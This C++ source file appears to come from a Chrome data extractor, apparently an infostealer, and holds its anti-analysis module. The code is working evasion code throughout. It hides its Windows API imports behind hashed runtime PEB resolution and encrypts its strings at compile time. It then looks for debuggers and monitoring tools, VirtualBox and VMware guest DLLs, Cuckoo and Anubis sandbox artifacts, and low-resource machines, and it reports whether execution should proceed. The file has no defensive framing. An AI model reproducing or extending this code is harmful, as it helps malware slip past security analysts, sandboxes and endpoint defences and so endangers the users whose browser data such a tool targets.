#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#pragma comment(lib, "kernel32.lib")

#include "str_encrypt.h"
#include "peb_resolve.h"

// All detection-related strings are compile-time encrypted with XSTR().
// All API calls are PEB-resolved at runtime — no psapi, advapi32 or user32
// entries in the IAT.

using namespace ChromeExtractor::Syscalls;

// ── cached module handles (file-local) ─────────────────────────────────────

static void* KernelMod() {
    static void* h = nullptr;
    if (!h) {
        h = PebGetModule(H_KERNELBASE);
        if (!h) h = PebGetModule(H_KERNEL32);
    }
    return h;
}
static void* PsapiMod() {
    // Win10+: psapi forwards to KernelBase; try psapi first for XP compat
    static void* h = nullptr;
    if (!h) {
        constexpr DWORD kPsapi = PebHash("psapi.dll");
        h = PebGetModule(kPsapi);
        if (!h) h = KernelMod();   // forwarded on Win10+
    }
    return h;
}
static void* AdvapiMod() {
    static void* h = nullptr;
    if (!h) {
        constexpr DWORD kAdv = PebHash("advapi32.dll");
        h = PebGetModule(kAdv);
    }
    return h;
}
static void* User32Mod() {
    static void* h = nullptr;
    if (!h) {
        constexpr DWORD kU32 = PebHash("user32.dll");
        h = PebGetModule(kU32);
    }
    return h;
}

// ── resolver shims ──────────────────────────────────────────────────────────

template<typename Fn>
static inline Fn K32Fn(DWORD nameHash) {
    void* m = KernelMod();
    return m ? reinterpret_cast<Fn>(PebGetExport(m, nameHash)) : nullptr;
}
template<typename Fn>
static inline Fn PsapiFn(DWORD nameHash) {
    void* m = PsapiMod();
    return m ? reinterpret_cast<Fn>(PebGetExport(m, nameHash)) : nullptr;
}
template<typename Fn>
static inline Fn AdvapiFn(DWORD nameHash) {
    void* m = AdvapiMod();
    return m ? reinterpret_cast<Fn>(PebGetExport(m, nameHash)) : nullptr;
}
template<typename Fn>
static inline Fn U32Fn(DWORD nameHash) {
    void* m = User32Mod();
    return m ? reinterpret_cast<Fn>(PebGetExport(m, nameHash)) : nullptr;
}

// ── type aliases ────────────────────────────────────────────────────────────

using FnEnumProcesses      = BOOL(WINAPI*)(DWORD*, DWORD, DWORD*);
using FnOpenProcess        = HANDLE(WINAPI*)(DWORD, BOOL, DWORD);
using FnGetModBaseNameA    = DWORD(WINAPI*)(HANDLE, HMODULE, LPSTR, DWORD);
using FnCloseHandle        = BOOL(WINAPI*)(HANDLE);
using FnGetModHandleA      = HMODULE(WINAPI*)(LPCSTR);
using FnGetFileAttribA     = DWORD(WINAPI*)(LPCSTR);
using FnGlobalMemStatus    = BOOL(WINAPI*)(LPMEMORYSTATUSEX);
using FnRegOpenKeyExA      = LSTATUS(WINAPI*)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
using FnRegQueryValueExA   = LSTATUS(WINAPI*)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
using FnRegCloseKey        = LSTATUS(WINAPI*)(HKEY);
using FnGetSysMetrics      = int(WINAPI*)(int);

// ── hashes (computed at compile time) ───────────────────────────────────────

static constexpr DWORD kEnumProcesses     = PebHash("EnumProcesses");
static constexpr DWORD kOpenProcess       = PebHash("OpenProcess");
static constexpr DWORD kGetModBaseNameA   = PebHash("GetModuleBaseNameA");
static constexpr DWORD kCloseHandle       = PebHash("CloseHandle");
static constexpr DWORD kGetModHandleA     = PebHash("GetModuleHandleA");
static constexpr DWORD kGetFileAttribA    = PebHash("GetFileAttributesA");
static constexpr DWORD kGlobalMemStatus   = PebHash("GlobalMemoryStatusEx");
static constexpr DWORD kRegOpenKeyExA     = PebHash("RegOpenKeyExA");
static constexpr DWORD kRegQueryValueExA  = PebHash("RegQueryValueExA");
static constexpr DWORD kRegCloseKey       = PebHash("RegCloseKey");
static constexpr DWORD kGetSysMetrics     = PebHash("GetSystemMetrics");

// ── checks ──────────────────────────────────────────────────────────────────

static bool IsSuspiciousProcess_Check(DWORD* out_count) {
    // All names XOR-encrypted at compile time — no plaintext in .rdata
    auto pEnumProc    = PsapiFn<FnEnumProcesses>  (kEnumProcesses);
    auto pOpenProc    = K32Fn  <FnOpenProcess>     (kOpenProcess);
    auto pGetBaseName = PsapiFn<FnGetModBaseNameA> (kGetModBaseNameA);
    auto pCloseHandle = K32Fn  <FnCloseHandle>     (kCloseHandle);
    if (!pEnumProc || !pOpenProc || !pGetBaseName) return false;

    DWORD ids[1024] = {}; DWORD cb = 0;
    if (!pEnumProc(ids, sizeof(ids), &cb)) return false;
    DWORD count = cb / sizeof(DWORD);
    if (out_count) *out_count = count;

    // Suspect process names — compile-time encrypted
    const std::string suspects[] = {
        XSTR("windbg.exe"),   XSTR("x64dbg.exe"),   XSTR("x32dbg.exe"),
        XSTR("ida.exe"),      XSTR("ida64.exe"),     XSTR("ollydbg.exe"),
        XSTR("radare2.exe"),  XSTR("gdb.exe"),       XSTR("procmon.exe"),
        XSTR("procmon64.exe"),XSTR("regmon.exe"),    XSTR("filemon.exe"),
        XSTR("wireshark.exe"),XSTR("fiddler.exe"),
    };

    for (DWORD i = 0; i < count; i++) {
        HANDLE hp = pOpenProc(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, ids[i]);
        if (!hp) continue;
        char name[MAX_PATH] = {};
        if (pGetBaseName(hp, nullptr, name, sizeof(name))) {
            for (const auto& s : suspects) {
                if (lstrcmpiA(name, s.c_str()) == 0) {
                    if (pCloseHandle) pCloseHandle(hp);
                    return true;
                }
            }
        }
        if (pCloseHandle) pCloseHandle(hp);
    }
    return false;
}

static bool IsVirtualMachine_Check() {
    auto pGetMod = K32Fn<FnGetModHandleA>(kGetModHandleA);
    if (!pGetMod) return false;
    // VM DLL names — compile-time encrypted
    if (pGetMod(XSTR("VBoxHook.dll").c_str())  ||
        pGetMod(XSTR("VBoxMRXNP.dll").c_str()) ||
        pGetMod(XSTR("vmGuestLib.dll").c_str()) ||
        pGetMod(XSTR("vmhgfs.dll").c_str()))
        return true;
    return false;
}

static bool IsKnownSandbox_Check() {
    auto pGetMod     = K32Fn  <FnGetModHandleA>   (kGetModHandleA);
    auto pGetFileAtt = K32Fn  <FnGetFileAttribA>  (kGetFileAttribA);
    auto pRegOpen    = AdvapiFn<FnRegOpenKeyExA>   (kRegOpenKeyExA);
    auto pRegQuery   = AdvapiFn<FnRegQueryValueExA>(kRegQueryValueExA);
    auto pRegClose   = AdvapiFn<FnRegCloseKey>     (kRegCloseKey);

    // Sandbox module — compile-time encrypted
    if (pGetMod && pGetMod(XSTR("cuckoomon.dll").c_str())) return true;

    // Sandbox path — compile-time encrypted
    if (pGetFileAtt) {
        std::string anubisPath = XSTR("C:\\anubis_sandbox");
        if (pGetFileAtt(anubisPath.c_str()) != INVALID_FILE_ATTRIBUTES) return true;
    }

    if (pRegOpen && pRegQuery && pRegClose) {
        HKEY hk = nullptr;
        std::string regPath  = XSTR("SOFTWARE\\Microsoft\\Windows\\CurrentVersion");
        std::string keyName  = XSTR("ProductName");
        std::string virtPC   = XSTR("VirtualPC");
        std::string virtBox  = XSTR("VirtualBox");
        if (pRegOpen(HKEY_LOCAL_MACHINE, regPath.c_str(),
                     0, KEY_READ, &hk) == ERROR_SUCCESS) {
            char prod[256] = {}; DWORD sz = sizeof(prod);
            pRegQuery(hk, keyName.c_str(), nullptr, nullptr, (LPBYTE)prod, &sz);
            pRegClose(hk);
            if (strstr(prod, virtPC.c_str()) || strstr(prod, virtBox.c_str()))
                return true;
        }
    }
    return false;
}

// Hardware/behavioral sandbox checks — RELAXED to avoid false positives on real machines
static bool IsLikelySandbox_Check(DWORD proc_count) {
    auto pMemStat    = K32Fn<FnGlobalMemStatus>(kGlobalMemStatus);
    auto pSysMetrics = U32Fn<FnGetSysMetrics>  (kGetSysMetrics);

    // Minimal RAM: lowered threshold to 1 GB
    if (pMemStat) {
        MEMORYSTATUSEX ms = {}; ms.dwLength = sizeof(ms);
        if (pMemStat(&ms) && ms.ullTotalPhys < 1ULL * 1024 * 1024 * 1024)
            return true;
    }

    // Tiny screen: lowered to 640
    if (pSysMetrics && pSysMetrics(SM_CXSCREEN) < 640)
        return true;

    // Very few processes
    if (proc_count > 0 && proc_count < 10)
        return true;

    return false;
}

bool PerformEvasionChecks() {
    DWORD proc_count = 0;
    if (IsSuspiciousProcess_Check(&proc_count))
        return false;

    if (IsVirtualMachine_Check() || IsKnownSandbox_Check())
        return false;

    if (IsLikelySandbox_Check(proc_count))
        return false;

    return true;
}
